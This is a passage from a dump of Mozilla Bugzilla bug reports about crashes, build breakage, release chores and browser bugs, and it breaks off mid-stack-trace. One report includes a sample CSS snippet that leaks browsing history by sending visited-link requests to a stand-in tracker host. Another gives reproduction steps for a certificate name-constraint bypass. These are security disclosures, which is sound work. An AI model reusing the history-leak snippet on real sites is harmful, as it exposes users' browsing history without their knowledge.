22678,No such issue for Nightly if e10s is disabled. Dev Edition with e10s on works well.,Failed to establish Cisco Spark call with Nightly if e10s is enabled
22712,"Given a CA certificate with a Name Constraints extension with:                 Permitted:                   DNS:.de                   DNS:.com                   email:.de                   email:.com  Given a server certificate, issued by above CA, using a hostname in the .org domain:  Using a Firefox profile that trusts above CA certificate, and connects to a server using a certificate issued by above CA, which isn't whitelisted as permitted.  Expected: NSS rejects the certificate and Firefox aborts the connection  Actual behaviour: NSS acceptes it and Firefox connects successfully.   Test case: - create a new Firefox test profile  - visit https://n-2.org:8654/   (expected: cert error because CA unknown)  - import the test CA that issued the server cert from     http://kuix.de/ca/constrained-test-ca.php   and mark it as trusted  - again visit (reload) https://n-2.org:8654/  - expected: cert should still get rejected  - incorrect behaviour: Firefox loads page without error   Dump of CA cert: Certificate:     Data:         Version: 3 (0x2)         Serial Number: 0 (0x0)     Signature Algorithm: sha1WithRSAEncryption         Issuer: C=DE, ST=Test State, L=Test Loc, O=Test Org, CN=Kai's Constrained .de .com Test CA         Validity             Not Before: Dec 29 14:45:31 2012 GMT             Not After : Mar 29 14:45:31 2021 GMT         Subject: C=DE, ST=Test State, L=Test Loc, O=Test Org, CN=Kai's Constrained .de .com Test CA         Subject Public Key Info:             Public Key Algorithm: rsaEncryption                 Public-Key: (1024 bit)                 Modulus:                     00:cd:11:fe:24:95:eb:c2:a0:a5:23:ed:db:5c:03:                     46:ef:00:48:8f:d3:12:c0:8a:82:f4:b1:82:80:4c:                     89:84:59:72:75:0b:a4:77:69:8b:6c:c8:43:4f:7a:                     08:b2:26:b4:25:46:69:90:40:25:5e:13:18:86:64:                     28:9e:46:9d:54:cd:19:ae:d5:15:25:bf:b7:5c:66:                     d1:bb:02:10:db:ae:70:f0:d7:d1:09:a0:77:a0:96:                     2c:a3:20:82:6a:c0:61:4d:60:96:07:81:aa:48:13:                     92:d9:53:e2:45:56:57:69:14:f9:de:9f:cd:57:e2:                     89:8f:8a:92:21:0f:2b:95:55                 Exponent: 65537 (0x10001)         X509v3 extensions:             Netscape Cert Type:                  SSL CA, S/MIME CA, Object Signing CA             X509v3 Name Constraints:                  Permitted:                   DNS:.de                   DNS:.com                   email:.de                   email:.com              X509v3 Basic Constraints: critical                 CA:TRUE             X509v3 Key Usage:                  Certificate Sign, CRL Sign     Signature Algorithm: sha1WithRSAEncryption          6c:38:d4:6e:98:20:c6:96:86:0f:41:47:30:b5:ef:6a:3a:7c:          06:40:88:bc:3d:db:a9:ff:d9:15:a0:af:67:43:9a:3a:c6:7f:          b6:bc:95:f8:4e:c0:6d:25:9a:0e:d8:e9:09:c8:fc:86:ad:2b:          a5:ef:d1:65:c7:b6:69:35:e4:79:a4:e0:c8:47:ee:52:b1:45:          d4:c6:9a:76:e5:9c:88:d4:6e:a7:e2:49:7d:c6:11:63:b4:d4:          ac:22:1d:ea:9f:33:b1:e9:17:4b:11:9a:5d:e5:46:48:fb:4c:          7f:ed:d2:76:51:5d:4e:f6:80:55:5b:ca:c5:57:ee:a8:55:85:          45:f6  Dump of server cert: Certificate:     Data:         Version: 3 (0x2)         Serial Number: 5 (0x5)     Signature Algorithm: sha1WithRSAEncryption         Issuer: C=DE, ST=Test State, L=Test Loc, O=Test Org, CN=Kai's Constrained .de .com Test CA         Validity             Not Before: Mar 29 15:03:31 2013 GMT             Not After : Mar 29 15:03:31 2018 GMT         Subject: C=DE, ST=Test State, L=Test Loc, O=Test Org, CN=n-2.org         Subject Public Key Info:             Public Key Algorithm: rsaEncryption                 Public-Key: (1024 bit)                 Modulus:                     00:bd:2f:35:7a:26:ef:82:15:55:93:27:38:c9:58:                     c3:b5:3b:0c:c8:41:13:25:69:3f:56:90:ec:1b:fd:                     54:20:e3:ca:34:b0:6a:96:9c:0a:f0:89:a7:4e:42:                     1f:60:0e:33:f0:3b:35:85:e3:66:1c:f8:4a:5c:c3:                     24:54:80:db:b8:9b:e9:ff:5a:2c:f8:88:9b:d2:7b:                     a7:53:21:9b:21:9b:52:e7:ce:3a:03:9a:d1:66:09:                     59:ef:09:9b:80:66:4d:83:df:3f:57:fb:c9:b5:14:                     91:2d:4a:5b:ca:90:40:6d:00:2d:a0:64:25:8c:4a:                     13:6f:9c:06:fe:a5:e9:05:23                 Exponent: 65537 (0x10001)         X509v3 extensions:             Netscape Cert Type:                  SSL Client, SSL Server             X509v3 Basic Constraints: critical                 CA:FALSE             X509v3 Key Usage:                  Key Encipherment, Data Encipherment, Key Agreement     Signature Algorithm: sha1WithRSAEncryption          4b:81:63:a2:cb:31:21:24:01:cd:31:bc:40:77:73:41:fc:d4:          42:55:08:00:ca:ca:44:f3:95:8e:bb:7e:2f:5c:b2:85:1d:0e:          0e:47:b5:d0:67:24:78:c2:0d:c1:a6:26:8a:78:c1:3a:96:3f:          f8:e9:d7:d4:63:45:a8:69:2c:e2:1d:fe:6f:86:b2:e5:e6:e0:          69:54:0f:17:54:e2:0a:dd:9d:6d:3a:6e:46:c3:34:25:e5:35:          32:5c:99:4d:32:c9:84:94:8c:66:41:e0:5e:ae:23:96:19:2f:          e3:75:54:dd:84:91:42:3f:03:de:a9:ea:77:71:f4:b6:70:e2:          59:b1",Name Constraints ignored by libPKIX verification engine (in both intermediate and toplevel CA certificates)
22757,"karma is running out of disk space, so we need to archive the CVS tagging areas so we can reclaim some 400 megs of diskspace per RC.  The basic process for this is to run a cvs stat (make sure -q is NOT on) in the cvsroot, l10n, and mofo directories; archive these to $area-stat.log (i.e. cvsroot-stat.log, etc.), then remove cvsroot/mozilla, l10n/l01n and mofo/talkback.  Then, tar cfvj up what's left, so we keep all the associated checkout/tag files.  This needs to be done for all the directories in ~cltbld/tags and /build/tags, and must be supervised to ensure the commands don't timeout/error out/etc., as this is our reference copy of the tag.",Archive CVS tagging areas on karma
22781,"Affected FF 13.0.2 chemspill. Bug 767739 was presenting issue, but Shyam pointed out we would have avoided any impact to build vpn (including releases) if we'd been using the hg mirrors set up for us.  Most of the build infra was done via bug 745299, but repacks don't use hgtool, so only use the public hg web servers. When the public hg web servers are having troubles, repacks fail.",release l10n repacks not using releng hg mirrors
22792,"Using :visited and url() in background-image leaks browsing history back to a web server.  The server can pair the url() requests for visited links with a user who hits their site, thus reconstructing browser history.  Should have been fixed by bug 147777.  Reproduced on mac and linux in ""Gecko/20100405 Minefield/3.7a4pre""  Steps to Reproduce: 1) visit amazon.com in a clean profile 2) visit http://browser-recon.info 3) click the ""View"" link under the banner 4) observe that amazon.com is visited  Sample Code: <head> [...] <style type=""text/css"">   #foo:visited{     background: url(http://evil.eve.ws/tracker?who=thisuser&what=somebank);   } </style> </head>     <body> <a id=""foo"" href=""http://some.bank.com/login""></a> [...]",:visited and background-image still allows queries into global history
22805,"Steps to reproduce: 1. go to url above (http://bugzilla.mozilla.org/buglist.cgi? order=bugs.bug_id&short_desc_type=substring&short_desc=new%20window) 2. try to resort by clicking on one of the column headers  Result: end up at http://bugzilla.mozilla.org/buglist.cgi? order=bugs.bug_id&short_desc_type=substring&short_desc=new% 20window&order=bugs.resolution%2C%20bugs.bug_id   (notice that the order at the beginning hasn't been removed)   this creates an sql error when it tries to ORDER BY bugs.bug_idbugs.resolution, bugs.bug_id","if order is the first param to buglist.cgi, can't resort"
22830,"From Bugzilla Helper: User-Agent: Mozilla/5.0 (Windows; U; Win98; en-US; rv:0.9.6) Gecko/20011120 BuildID:    2001112009  In the page http://www.bravenet.com/reviews/coolscripts/ , clicking on the listed hyperlinks should bring up a pop-up window. It doesn't  Reproducible: Always Steps to Reproduce: 1. Click on one of the listed links, for example 'ColorPicker Script'   Actual Results:  It stays in the same window, keeps the background and just show it's loading in the top-right corner.  Expected Results:  It should just open up a pop-up window.  All the hyperlinks are using javscript","document.open(a, b, c); should act like window.open(a, b, c) when all 3 arguments are specified."
22875,"If you look at the results of the last run, on Windows 7 both Personas Plus and SimilarWeb have extremely high impact percentages (201% and 221%, respectively). At least in the case of Personas Plus this is making the add-on appear on the top slowness list when it probably shouldn't be there (although it comes close anyway).  We should investigate the cause of these discrepancies, and discard the Windows 7 results for both these add-ons, or all of them if we discover this is a more general problem.",Suspiciously high performance impact reported for Personas Plus and SimilarWeb on Windows 7
22949,"signtool returncode has been misleading or irrelevant, now it has been fixed, but not all parts of the script deal with it yet",signtool returncode still ignored in tools.sh
23122,"User Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0 (Beta/Release) Build ID: 20140211004037  Steps to reproduce:  I created a sync account, successfully logged in and synced   Actual results:  Every time i restart Aurora sync encountered and error. It does not retry or if it does it fails. I have to manually go to sign in again   Expected results:  I should stay signed in.",Signed out of Sync with every Restart
23198,*** Original post on bio 2251 at 2013-11-15 11:13:00 UTC ***  This is how the debug log looks: [14/11/13 21:38:57] ERROR (@ prpl-irc resource://gre/components/irc.js:722) Connection closed by server. [14/11/13 21:38:57] LOG   (@ prpl-irc resource:///modules/socket.jsm:181) Disconnect [14/11/13 21:38:58] LOG   (@ prpl-irc resource:///modules/socket.jsm:145) Connecting to: chat.freenode.net:6667 [14/11/13 21:38:58] LOG   (@ prpl-irc resource:///modules/socket.jsm:330) using socks proxy: localhost:1080 [14/11/13 21:38:58] DEBUG (@ prpl-irc resource:///modules/socket.jsm:524) onTransportStatus(STATUS_RESOLVING) [14/11/13 21:38:58] DEBUG (@ prpl-irc resource:///modules/socket.jsm:524) onTransportStatus(STATUS_RESOLVED) [14/11/13 21:38:58] DEBUG (@ prpl-irc resource:///modules/socket.jsm:524) onTransportStatus(STATUS_CONNECTING_TO) [14/11/13 21:38:58] DEBUG (@ prpl-irc resource:///modules/socket.jsm:524) onTransportStatus(STATUS_CONNECTING_TO) [14/11/13 21:38:58] DEBUG (@ prpl-irc resource:///modules/socket.jsm:524) onTransportStatus(STATUS_CONNECTING_TO) [14/11/13 21:38:58] DEBUG (@ prpl-irc resource:///modules/socket.jsm:524) onTransportStatus(STATUS_CONNECTING_TO) [14/11/13 21:38:58] DEBUG (@ prpl-irc resource:///modules/socket.jsm:524) onTransportStatus(STATUS_CONNECTING_TO) [14/11/13 21:38:58] DEBUG (@ prpl-irc resource:///modules/socket.jsm:524) onTransportStatus(STATUS_CONNECTING_TO) [14/11/13 21:38:58] DEBUG (@ prpl-irc resource:///modules/socket.jsm:524) onTransportStatus(STATUS_CONNECTING_TO) [14/11/13 21:38:58] DEBUG (@ prpl-irc resource:///modules/socket.jsm:447) onStartRequest,"Accounts stuck in the ""Connecting..."" state"
23212,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.9) Gecko/20100317 Lightning/1.0b1 Thunderbird/3.0.4  When I add this url ""http://houston.craigslist.org/search/sss?query=google+nexus+(N1|one)+-(broken)+-(NOT+CHINA+KNOCK+OFF)+-(832-531-5184)+-(Dr+Cell+Phone)&format=rss"" into my RSS feed TB will check the feed once, but when I close and reopen TB the feed is cut into two entries.  The first entry is ""http://houston.craigslist.org/search/sss?query=google+nexus+(N1"" and the 2nd entry is ""one)+-(broken)+-(NOT+CHINA+KNOCK+OFF)+-(832-531-5184)+-(Dr+Cell+Phone)&format=rss"".  It appears the | in the feed is breaking the url in TB.  On craigslist the | is use to OR a statement together.  The feeds are structured like this Craigslist (Folder)  - Feed 1  - Feed 2  - Feed 3  Also, as a part of this bug once the feed is broken in to two pieces I can no longer delete the feed.  I have to go to ""C:\Users\username\AppData\Roaming\Thunderbird\Profiles\ve5l8jty.user\Mail\News & Blogs"" and delete everything in the folder.  I'm sure there's a way to figure out what file to delete, but I'm unable to figure it out.  Reproducible: Always  Steps to Reproduce: 1.Subscribe to the feed referenced above 2.Close TB 3.Open TB and the feed is broke Actual Results:   1.Feed subscribes and updates once 2. After open & close the feed is broke  Expected Results:   1.Subscribe the feed 2.Open TB and the feed updates",When using the URL referenced the feed gets cut into two pieces making the feed invalid
23224,"User-Agent:       Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 Build Identifier: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0  For the given html/javascript gc doesn't seem to catch up with javascript. Happens on win32 and linux x86.  Reproducible: Always  Steps to Reproduce: 1. start empty firefox 2. open attached html in only page 3. watch memory usage grow  if another page is opened or this page is reloaded GC runs and memory usage drops; same for forceGC() in error console.  Actual Results:   memory grows, system swaps, firefox gets oom'ed  Expected Results:   memory stays constant or oscillates within reasonable range",GC doesn't get triggered for this javascript
23267,"When entering the URL mentioned above, the page never loads. Works fine in IE 5.5 and Netscape 4.7x  Loading the page via SQUID proxy works fine",URL doesn't load
23271,"From Bugzilla Helper: User-Agent: Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:0.9.3) Gecko/20010801 BuildID:    2001080110  There seems to exist a memory leak in the browser implementation: When I use Mozilla over a longer periode of time without restarting it, memory consumption continues to grow. The memory once allocated by a browser window is obviously only partly given back to the system, at least thats what the NT task manager view suggests. Once I end up with a total memory consumption of more than 200 MB (after browsing several very long tables)!  Reproducible: Always Steps to Reproduce: You can easily reproduce the effect by opening a simple table with some columns and, lets say, 1000 rows  close it, open it again, close it, ...  The pages i used contained JavaScript.  My cache settings are: 4096 memory, 5000 disk, automatically","memory consumption very high, memory leak?"
23294,"User-Agent:       Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.2a) Gecko/20020910 Build Identifier: Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.2a) Gecko/20020910  Browser opens the file in window, instead of downloading it.  Reproducible: Always  Steps to Reproduce: 1.left click at file 2.right click at file and chose Save link target as Actual Results:   1.if I left click at file, browser tryes to open it as it was text file 2.if I right click at file and chose Save link target as, browser offers me to save it as Text file (of EXE file)  Expected Results:   1.offer, if the file should be ""Open with application XYZ"", as it does with Windows registered file types, or Download the file 2.Don't be fixed to Text or EXE file format (it depends on extension of file; .ISO file is treaten as ""text"", some other extensions are treaten as ""EXE""  It seems, that Mozilla does this only with files that are not registered in Windows (linked with some application).",ftp://ftp.redhat.com/pub/redhat/linux/7.3/en/iso/i386/
23307,"User-Agent:       Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705) Build Identifier: BuildID:2002101612  I tried to change skins. After closing down and restarting Mozilla, I  discovered the interface on the  webpage ""http://home.attbi.com/~Medwards/mozerr.htm"". This also corrupted my  Netscape 7.0 browser, so that I cannot realistically use either Mozilla or  Netscape.  I couldn't find anything in any of the prefs files that would seem to cause  this, and don't have a clue on where else to look either...  Reproducible: Always  Steps to Reproduce: I can't say I've reproduced it - I can't get it to go away...  1.install a new skin on the mozilla.org site, by clicking on the ""install it""  link 2. restart Mozilla 3. Yikes! There it is!  Actual Results:   I ended up with the display as shown  at ""http://home.attbi.com/~Medwards/mozerr.htm""  Expected Results:   It should have not displayed this huge box within a box interface.","After changing skin to Modern, entire browser interface changed to boxes within boxes"
23382,"+++ This is a split-off for a regression caused by bug 489609 +++  This is an *alternative* to bug 525225. Bug 525225 would be far better, but it's blocked by bug 492645.   From bug 489609: -------  Comment #75 From  Ben Bucksch   2009-10-29 07:52:38 PDT   (-) [reply] -------      Private  Mark, whether 1) the growing header pane after clicking ""more"" with lots of recipients or 2) a cut-off subject is worse is a judgment call. I don't think either are inherently worse than the other. I like neither of them.  ------- Comment #76 From Ben Bucksch 2009-10-29 07:55:46 PDT (-) [reply] ------- Private  (But if it was my call, I think I'd live 1 rather than 2.)  ------- Comment #77 From Bryan W Clark (:clarkbw) 2009-10-29 09:40:40 PDT (-) [reply] ------- Private  Before just regular comments.  I just did a quick test with the patch inline at the bottom of this comment.  By using the (more) link to fake out the all headers mode it seems to me that we can force a scroll bar when someone clicks on the more link and then on cleanup we reset the mode back to what it was.  Note that in my patch here I didn't save the original mode and set it back which would likely be the more correct thing to do.  In my testing I looked at a message with a lot of addresses that would right now fill up the entire message area when more was clicked.  After clicking more I selected another message with a long subject and it renders correctly as the mode gets reset.  I did this in both All and Normal header modes selected.  The only issue I see is that whatever the size of the header at the time you click (more) is what it will render with, it doesn't expand the headers to a larger height and give you the scroll bars but I find it acceptable.  Is something like this a possible option for TB3?  [Patch here]  ------- Comment #78 From Ben Bucksch 2009-10-29 10:07:19 PDT (-) [reply] ------- Private  I like that idea. I'll play with it.  ------- Comment #79 From rsx11m 2009-10-29 11:01:58 PDT (-) [reply] ------- Private  What happens if you remove show_header_mode before this.clearChildNodes() and set it after this.fillAddressesNode() instead? The idea being that you allow the header pane to flex in height while refilling the headers after ""more"" has been clicked, and once this is done, allow it to be cropped to max-height and the scrollbar to appear if necessary? This may be a delicate timing though.  ------- Comment #80 From Ben Bucksch 2009-10-29 12:28:33 PDT (-) [reply] ------- Private  If there's a truely long header (I made an artificial test with a post to 30 newsgroups), the header pane in normal mode takes the majority of the message pane, without scrollbar, without ever having clicked ""more"" (the Newsgroups header has no ""more"" button). The same would be with a subject with 500+ characters, although you could argue that the subject then is the message ;-).",Workaround for bug 525225 / bug 492645
23468,User-Agent:       Mozilla/5.0 (OS/2; U; Warp 4.5; en-US; rv:1.3a) Gecko/20021212 Build Identifier: Mozilla/5.0 (OS/2; U; Warp 4.5; en-US; rv:1.3a) Gecko/20021212  Bookmark window never works.  Reproducible: Always  Steps to Reproduce: 1. 2. 3.,Bookmark window doesn't work
23734,User-Agent:       Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0 Build Identifier: Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0  1.goto www.settrade.com 2.login to any broker 3.firefox 1.0 said done but nothing happen  Reproducible: Didn't try,goto www.settrade.com then login to my  broker ......the browser said done ... and nothing happen
23765,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2b5) Gecko/20091204 Firefox/3.6b5 (.NET CLR 3.5.30729) Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2b5) Gecko/20091204 Firefox/3.6b5 (.NET CLR 3.5.30729)  The most recent version of DOM inspector no longer allows users to edit the CSS attributes individually through the CSS Rules view (object menu-top right window pane).  Users are still able to edit the CSS properties under the DOM Node view, however this is limiting as you must edit the entire string of CSS attributes instead of a single property.  Reproducible: Sometimes  Steps to Reproduce: 1.Navigate to any page with CSS applied to various elements 2.Open DOM Inspector 3.Select a node in the DOM  (Div, iframe, Span..etc) 4.in the top right hand pane, click the drop down and choose ""CSS Rules"" 5.in the bottom right pane select CSS attribute property 6.Right click to edit   7.menu is grayed out  Actual Results:   Unable to edit/insert CSS attributes.  However, if you edit the CSS string under the menu option "" DOM Node"", you can now apply/edit the styles.  Expected Results:   In previous versions we were able to edit these attributes direction and individually under the CSS Rules menu option  It would be very helpful to be able to use this tool as we could with previous versions or to understand what exactly changed and why.",Recent Version of DOM Inspector (2.04) unable to edit CSS properties in CSS Rules view
23937,Make finding and creating bookmarks and history easier.,New Bookmarks & History System
24037,"This is a tracking bug for Build and Release of SeaMonkey 2.9 final  We expect an actual release on Tuesday, 24 April .",Tracking bug for build and release of SeaMonkey 2.9 final
24100,"This has now happened twice in the last hour. I uploaded an attachment, and after it was uploaded, no keyboard shortcuts or anything else menu-related worked...so I looked up and discovered that all the menus but ""Camino"" and ""Edit"" had disappeared.  A re-launch fixed it. Filing as UNCO to ensure it isn't just wackiness with my Mac.","Uploading attachments to Bugzilla makes all Camino menus except ""Camino"" and ""Edit"" disappear"
24142,can we please get a bmo production push to address some critical issues related to yesterdays tracking flags migration.  checksetup.pl : indeed schema changes: none revisions     : 9058 - 9060,push updated bugzilla.mozilla.org live
24240,"This is related to bug 379491.  Might even be the same.  valgrind is telling me:  ==5993== Invalid free() / delete / delete[] ==5993==    at 0x400525D: free (vg_replace_malloc.c:233) ==5993==    by 0x41088C9: free (nsTraceMalloc.c:1813) ==5993==    by 0x470CBA2: PR_Free (prmem.c:490) ==5993==    by 0x469EDC1: NS_Free_P (nsMemoryImpl.cpp:303) ==5993==    by 0x4F6126B: nsMemory::Free(void*) (nsMemory.h:74) ==5993==    by 0x4FC9F62: ReadScriptFromStream(JSContext*, nsIObjectInputStream*, JSScript**) (mozJSComponentLoader.cpp:406) ==5993==    by 0x4FCD245: mozJSComponentLoader::ReadScript(nsIFastLoadService*, char const*, nsIURI*, JSContext*, JSScript**) (mozJSComponentLoader.cpp:974) ==5993==    by 0x4FCE028: mozJSComponentLoader::GlobalForLocation(nsILocalFile*, JSObject**, char**) (mozJSComponentLoader.cpp:1114) ==5993==    by 0x4FCB4C8: mozJSComponentLoader::LoadModule(nsILocalFile*, nsIModule**) (mozJSComponentLoader.cpp:598) ==5993==    by 0x46853CE: nsFactoryEntry::GetFactory(nsIFactory**) (nsComponentManager.cpp:3577) ==5993==    by 0x4680643: nsComponentManagerImpl::CreateInstanceByContractID(char const*, nsISupports*, nsID const&, void**) (nsComponentManager.cpp:1795) ==5993==    by 0x460FAA1: CallCreateInstance(char const*, nsISupports*, nsID const&, void**) (nsComponentManagerUtils.cpp:167) ==5993==  Address 0x66AAE58 is 0 bytes inside a block of size 824 free'd ==5993==    at 0x400525D: free (vg_replace_malloc.c:233) ==5993==    by 0x41088C9: free (nsTraceMalloc.c:1813) ==5993==    by 0x470CBA2: PR_Free (prmem.c:490) ==5993==    by 0x469EDC1: NS_Free_P (nsMemoryImpl.cpp:303) ==5993==    by 0x5129131: nsMemory::Free(void*) (nsMemory.h:74) ==5993==    by 0x512BB28: nsTranscodeJSPrincipals(JSXDRState*, JSPrincipals**) (nsJSPrincipals.cpp:152) ==5993==    by 0x45483B0: js_XDRScript (jsscript.c:674) ==5993==    by 0x44E2CD7: fun_xdrObject (jsfun.c:1452) ==5993==    by 0x4516609: js_XDRObject (jsobj.c:4730) ==5993==    by 0x4554A61: XDRValueBody (jsxdrapi.c:560) ==5993==    by 0x4554CB9: js_XDRAtom (jsxdrapi.c:635) ==5993==    by 0x4547DD2: XDRAtomMap (jsscript.c:488)  it looks like the failure to deserialize a principal (which might need its own bug) causes JS_XDRScript to return false under ReadScriptFromStream.  So we never reset |data| to whatever is in the xdr, andthen free it.  Except it's already been freed by the nsTranscodeJSPrincipals code.  This is basically blocking debugging for me, because my build simply won't start.",Invalid free deserializing JS component script
24433,"I didn't quite believe the first three runs on the tip of beta, because two of the slaves had hardly ever done anything before (2 and 50-odd runs lifetime), so I retriggered a bunch, and retriggered several on the previous push which had been green.  https://tbpl.mozilla.org/?tree=Mozilla-Beta&fromchange=93544fa24586&tochange=a46d688e46df&jobname=Panda.*tp4m says that something outside the tree caused us to become unable to run tp on Pandas on beta. Betting people are betting on bug 920757.  mozilla-beta is closed.",tpn on Pandas on mozilla-beta broken
24464,"With Ubuntu 11.04 (g++ 4.5.2 and GNU ld 2.21.0.20110327), I get this error when I try to compile Firefox:  c++ -fno-rtti -Wall -Wpointer-arith -Woverloaded-virtual -Wsynth -Wno-ctor-dtor-privacy -Wno-non-virtual-dtor -Wcast-align -Wno-invalid-offsetof -Wno-variadic-macros -Werror=return-type -Wno-long-long -fno-strict-aliasing -std=gnu++0x -pthread -pipe -fexceptions  -DDEBUG -D_DEBUG -DTRACING -g -fPIC -shared -Wl,-z,defs -Wl,-h,test.so -o test.so test.o === === If you get failures below, please file a bug describing the error === and your environment (compiler and linker versions), and use === --disable-elf-hack until this is fixed. === /home/jruderman/mozilla-central/objdir-ff-debug/build/unix/elfhack/elfhack -b test.so test.so: terminate called after throwing an instance of 'std::runtime_error'   what():  PT_GNU_RELRO segment doesn't start on a section start make[7]: *** [test.so] Aborted","elfhack fails with ""PT_GNU_RELRO segment doesn't start on a section start"""
24471,We need to update the Changes page for 2.20rc2 and 2.21.1.  Usually this is pretty easy. :-),Update Changes Page for 2.20rc2
24545,/home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:3470:23: error: unused variable 'contentOpener' [-Werror=unused-variable]   found by uplift simulation that simulates aurora as beta  https://treeherder.mozilla.org/logviewer.html#?job_id=83713900&repo=try,Perma Bustage when Aurora 54 moves to Beta in nsGlobalWindow.cpp:3470:23: error: unused variable 'contentOpener' [-Werror=unused-variable]
24564,"bl-bldxp01 is failing to test with output  Running MozillaAliveTest test ... Timeout = 45 seconds. Begin: Sat Jun  9 11:50:04 2007 cmd = c:/builds/tinderbox/Fx-Trunk/WINNT_5.1_Depend/firefox/firefox/firefox.exe -P default End:   Sat Jun  9 11:50:12 2007 ----------- Output from MozillaAliveTest -------------  ----------- End Output from MozillaAliveTest ---------  Error: firefox.exe: exited with status 5 MozillaAliveTest: test failed  This is after bug 383742 eating the storage for the tinderbox VM, and rhelmer disabling BreadkPad for bug 383861. The build does pass MozillaAliveTest on fx-win32-tbox.  When I try to run the 2007060904 build on Win XP then the crash reporter comes up but fails to submit a report. If I disable BreakPad using MOZ_CRASHREPORTER_DISABLE=1 then the Windows crash reporter appears but not Talkback. However, there are several reports from nightly testers that the build is fine on Vista, and single reports it's ok on XP & 2000.    http://forums.mozillazine.org/viewtopic.php?t=556878  I tried the previous build, http://hourly-archive.localgho.st/win32/20070608_0322_firefox-3.0a6pre.en-US.win32.zip and that starts up fine. Which gives a regression window of    http://hourly-archive.localgho.st/win32/20070609_0420_checkins.html  We (wildly??) speculating on IRC that this might be similar to bug 331404.",Windows 20070609 nightly doesn't start on some machines
24787,"The DNS rewrite (bug 205726) leaves NSPR not building on OpenVMS. In order to get it to build I need to no longer define ""struct addrinfo"" in _openvms.h.  I also need to define the environment variables GETADDRINFO and FREEADDRINFO so that the new code which does getenv() calls for these (only for OpenVMS) will work.  I'll post the patch next. Both files are OpenVMS specific and so shouldn't break anyone else.",Make new DNS code build/run on OpenVMS
24833,This bug was filed from the Socorro interface and is  report bp-e45070de-d043-4b7f-8a65-7957d0170619. ============================================================= Crashing Thread (14) Frame 	Module 	Signature 	Source 0 	ntdll.dll 	RtlpWaitOnCriticalSection 	 1 	ntdll.dll 	RtlpEnterCriticalSectionContended 	 2 	ntdll.dll 	RtlEnterCriticalSection 	 3 	msvp9dec.dll 	CFrameSurfaceAllocator::ReleaseDXVASurface(unsigned char) 	 4 	msvp9dec.dll 	CVP9SWinDXVAFrameManager::Invoke(IMFAsyncResult*) 	 5 	rtworkq.dll 	CSerialWorkQueue::OnReplyAsyncCallback::Release() 	 6 	ntdll.dll 	TppWorkpExecuteCallback 	 7 	ntdll.dll 	TppWorkerThread 	 8 	kernel32.dll 	BaseThreadInitThunk 	 9 	ntdll.dll 	RtlUserThreadStart  crash reports with this signature started regressing in frequency in 55.0a1 20170610030207 and subsequent builds. they all are from installations with an intel gpu and from firefox 64bit versions on windows 10 so far.  this would be the pushlog from 20170610030207 to the day before: https://hg.mozilla.org/mozilla-central/pushloghtml?startdate=2017-06-09&tochange=91dc9525c422f11041da33b008b14a8117ed9a40 some av/graphics bugs getting fixed in that timeframe:  https://bugzilla.mozilla.org/buglist.cgi?list_id=13640005&resolution=---&resolution=FIXED&resolution=INVALID&resolution=WONTFIX&resolution=DUPLICATE&resolution=WORKSFORME&resolution=INCOMPLETE&resolution=SUPPORT&resolution=EXPIRED&resolution=MOVED&chfieldto=2017-06-10&chfield=cf_status_firefox55&query_format=advanced&chfieldfrom=2017-06-09&chfieldvalue=fixed&component=Audio%2FVideo&component=Audio%2FVideo%3A%20MediaStreamGraph&component=Audio%2FVideo%3A%20Playback&component=Graphics&component=Graphics%3A%20Layers&component=Graphics%3A%20Text&component=Graphics%3A%20WebRender&product=Core,Crash in RtlpWaitOnCriticalSection | RtlpEnterCriticalSectionContended | RtlEnterCriticalSection | CFrameSurfaceAllocator::ReleaseDXVASurface
24856,"This prevents running chrome test, at least when using debug builds.  #0  0x00000032d7097581 in nanosleep () from /lib64/libc.so.6 #1  0x00000032d70973a4 in sleep () from /lib64/libc.so.6 #2  0x00002aaaaaaf4bad in ah_crap_handler (signum=6)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/toolkit/xre/nsSigHandlers.cpp:149 #3  0x00002aaaaaaf576c in nsProfileLock::FatalSignalHandler (signo=6) at nsProfileLock.cpp:216 #4  <signal handler called> #5  0x00000032d70305c5 in raise () from /lib64/libc.so.6 #6  0x00000032d7032070 in abort () from /lib64/libc.so.6 #7  0x00002aaaaadb017c in JS_Assert (s=<value optimized out>, file=<value optimized out>, ln=<value optimized out>)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsutil.cpp:63 #8  0x00002aaaaad83d2f in ReconstructPCStack (cx=0x3bd9620, script=0x39be860, target=0x39bee16 ""V"", pcstack=0x120e450)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsopcode.cpp:5200 #9  0x00002aaaaad8cd87 in DecompileExpression (cx=0x3bd9620, script=0x39be860, fun=0x2a4f8c0, pc=0x39bee16 ""V"")     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsopcode.cpp:5086 #10 0x00002aaaaad8d041 in js_DecompileValueGenerator (cx=0x3bd9620, spindex=0, v=7802996, fallback=0x0)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsopcode.cpp:4974 #11 0x00002aaaaad39857 in js_ReportValueErrorFlags (cx=0x3bd9620, flags=5, errorNumber=162, spindex=0, v=7802996,      fallback=0x0, arg1=0x0, arg2=0x0) at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jscntxt.cpp:1340 #12 0x00002aaaaad7e943 in js_GetPropertyHelper (cx=0x3bd9620, obj=0x2bc0580, id=7802996, vp=0x7fff48a01e48, entryp=0x0)     at 